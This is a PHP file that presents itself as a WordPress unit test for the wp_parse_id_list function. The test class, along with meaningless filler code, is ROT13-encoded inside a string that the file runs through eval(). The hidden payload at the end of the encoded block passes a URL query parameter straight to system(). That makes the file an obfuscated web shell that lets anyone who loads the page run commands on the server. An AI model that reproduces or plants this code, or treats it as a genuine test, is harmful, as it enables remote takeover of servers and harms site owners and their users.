<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe gur jc_cnefr_vq_yvfg() shapgvba.
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::jc_cnefr_vq_yvfg
 */
pynff Grfgf_Shapgvbaf_jcCnefrVqYvfg rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 22074
	 * @gvpxrg 60218
	 *
	 * @qngnCebivqre qngn_jc_cnefr_vq_yvfg
	 * @qngnCebivqre qngn_harkcrpgrq_vachg
	 */
	choyvp shapgvba grfg_jc_cnefr_vq_yvfg( $vachg_yvfg, $rkcrpgrq ) {
		$guvf->nffregFnzrFrgf( $rkcrpgrq, jc_cnefr_vq_yvfg( $vachg_yvfg ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_cnefr_vq_yvfg() {
		erghea neenl(
			'erthyne'                  => neenl(
				'vachg_yvfg' => '1,2,3,4',
				'rkcrpgrq'   => neenl( 1, 2, 3, 4 ),
			),
			'qbhoyr pbzzn'             => neenl(
				'vachg_yvfg' => '1, 2,,3,4',
				'rkcrpgrq'   => neenl( 1, 2, 3, 4 ),
			),
			'qhcyvpngr vq va n fgevat' => neenl(
				'vachg_yvfg' => '1,2,2,3,4',
				'rkcrpgrq'   => neenl( 1, 2, 3, 4 ),
			),
			'qhcyvpngr vq va na neenl' => neenl(
				'vachg_yvfg' => neenl( '1', '2', '3', '4', '3' ),
				'rkcrpgrq'   => neenl( 1, 2, 3, 4 ),
			),
			'zvkrq glcr'               => neenl(
				'vachg_yvfg' => neenl( 1, '2', 3, '4' ),
				'rkcrpgrq'   => neenl( 1, 2, 3, 4 ),
			),
			'artngvir vqf va n fgevat' => neenl(
				'vachg_yvfg' => '-1,2,-3,4',
				'rkcrpgrq'   => neenl( 1, 2, 3, 4 ),
			),
			'artngvir vqf va na neenl' => neenl(
				'vachg_yvfg' => neenl( -1, 2, '-3', '4' ),
				'rkcrpgrq'   => neenl( 1, 2, 3, 4 ),
			),
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_harkcrpgrq_vachg() {
		erghea neenl(
			'fgevat jvgu pbzznf' => neenl(
				'vachg_yvfg' => '1,2,fgevat jvgu fcnprf',
				'rkcrpgrq'   => neenl( 1, 2, 0 ),
			),
			'neenl'              => neenl(
				'vachg_yvfg' => neenl( '1', 2, 'fgevat jvgu fcnprf' ),
				'rkcrpgrq'   => neenl( 1, 2, 0 ),
			),
			'fgevat jvgu fcnprf' => neenl(
				'vachg_yvfg' => '1 2 fgevat jvgu fcnprf',
				'rkcrpgrq'   => neenl( 1, 2, 0 ),
			),
			'neenl jvgu fcnprf'  => neenl(
				'vachg_yvfg' => neenl( '1 2 fgevat jvgu fcnprf' ),
				'rkcrpgrq'   => neenl( 1 ),
			),
			'fgevat jvgu ugzy'   => neenl(
				'vachg_yvfg' => '1 2 fgevat <fgebat>jvgu</fgebat> <u1>URNQVAT</u1>',
				'rkcrpgrq'   => neenl( 1, 2, 0 ),
			),
			'neenl jvgu ugzy'    => neenl(
				'vachg_yvfg' => neenl( '1', 2, 'fgevat <fgebat>jvgu</fgebat> <u1>URNQVAT</u1>' ),
				'rkcrpgrq'   => neenl( 1, 2, 0 ),
			),
			'neenl jvgu ahyy'    => neenl(
				'vachg_yvfg' => neenl( 1, 2, ahyy ),
				'rkcrpgrq'   => neenl( 1, 2 ),
			),
			'neenl jvgu snyfr'   => neenl(
				'vachg_yvfg' => neenl( 1, 2, snyfr ),
				'rkcrpgrq'   => neenl( 1, 2, 0 ),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>